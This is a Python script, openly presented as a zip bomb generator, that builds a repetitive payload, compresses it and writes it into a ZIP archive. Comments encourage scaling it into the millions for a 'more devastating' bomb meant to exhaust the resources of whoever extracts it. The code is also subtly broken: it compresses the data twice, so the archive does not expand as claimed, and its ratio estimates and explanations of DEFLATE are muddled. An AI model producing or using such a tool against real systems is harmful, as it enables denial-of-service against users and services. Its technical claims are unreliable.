import zipfile
import io
import zlib
import os

def create_zip_bomb(output_filename="zip_bomb.zip", 
                      seed_data_length=1024, 
                      repetition_factor=500000,
                      file_name="bomb_payload.txt"):
    """
    Generates a ZIP bomb by creating a highly repetitive data payload 
    that forces the DEFLATE compressor to over-expand significantly.

    Args:
        output_filename (str): The name for the resulting ZIP archive.
        seed_data_length (int): The length of the unique, initial data pattern (the seed).
        repetition_factor (int): How many times the compressor should ideally repeat the pattern 
                                  to achieve massive expansion. Higher = Bigger Bomb.
        file_name (str): The name given to the file inside the archive.
    """
    print(f"--- Starting Zip Bomb Generator ---")
    print(f"Target Output: {output_filename}")
    print(f"Repetition Factor: {repetition_factor:,} times.")

    # 1. Generate the Seed Data (The smallest unit that captures complexity)
    # Using a pseudo-random sequence ensures the compressor has patterns to exploit.
    seed = os.urandom(seed_data_length)

    # 2. Calculate Target Expansion (Approximation)
    # The total uncompressed size is roughly SeedSize * RepetitionFactor.
    # The compressed size will be close to the seed size itself.
    estimated_uncompressed_size = seed_data_length * repetition_factor

    print(f"\n[INFO] --- Theoretical Bomb Size ---")
    print(f"  Seed Size: {len(seed)} bytes")
    print(f"  Target Uncompressed Size: {estimated_uncompressed_size / (1024*1024):.2f} MB")
    print(f"  Compression Ratio Goal: {estimated_uncompressed_size / (seed_data_length / 2):.1f}:1 (very rough estimate)")

    # --- Core Bomb Generation ---

    # Create a raw stream buffer for the compressed data
    compressed_stream = io.BytesIO()

    # The key step: Using zlib.compress to compress the data.
    # The zlib library applies the DEFLATE algorithm.
    # We feed it data that is designed to be highly repetitive.
    # By concatenating the seed many times, we maximize the dictionary reference capability.

    # We create a buffer that simulates feeding the seed data 'repetition_factor' times
    # For simplicity, we are creating a massive concatenation of the seed data itself.
    huge_data_payload = b''
    for _ in range(repetition_factor):
        huge_data_payload += seed

    # Compress the gigantic payload
    compressed_data = zlib.compress(huge_data_payload)

    # --- 3. Create the ZIP Container ---

    try:
        with zipfile.ZipFile(output_filename, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Write the highly compressed stream as the file content
            zf.writestr(file_name, compressed_data)

        print("\n=============================================")
        print(f" SUCCESS! Zip bomb '{output_filename}' created.")
        print(f"   - Compressed Size: {len(compressed_data) / (1024*1024):.2f} MB")
        print(f"   - Expected Uncompressed Size: {estimated_uncompressed_size / (1024*1024):.2f} MB")
        print("=============================================")

    except Exception as e:
        print(f"\n[CRITICAL ERROR] Could not create the ZIP file: {e}")


if __name__ == "__main__":
    # --- CUSTOMIZATION PARAMETERS ---

    # 1. seed_data_length: How many bytes of unique data to use as the pattern. 
    #    Larger = more initial information.
    SEED_SIZE = 800 

    # 2. repetition_factor: !!! THIS IS THE MAIN LEVER !!!
    #    A higher number means a bigger, more devastating bomb. 
    #    Start with 100,000 for testing, and go higher (millions) for true bomb strength.
    REPETITION = 10000

    # 3. File Name and Output Name
    OUTPUT_ZIP = "super_bomb.zip"

    create_zip_bomb(
        output_filename=OUTPUT_ZIP,
        seed_data_length=SEED_SIZE,
        repetition_factor=REPETITION,
        file_name="bomb_payload.dat"
    )
